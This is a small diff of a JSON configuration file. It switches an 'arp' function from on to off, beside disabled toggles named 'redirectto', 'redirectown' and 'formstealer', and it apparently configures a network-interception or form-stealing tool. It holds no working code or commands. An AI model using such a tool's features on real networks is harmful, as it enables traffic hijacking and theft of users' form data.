@@ -11,7 +11,7 @@
       "favicon":"0"
     },
     "functions":{
-      "arp":"1",
+      "arp":"0",
       "redirectto":"0",
       "redirectown":"0",
       "formstealer":"0",
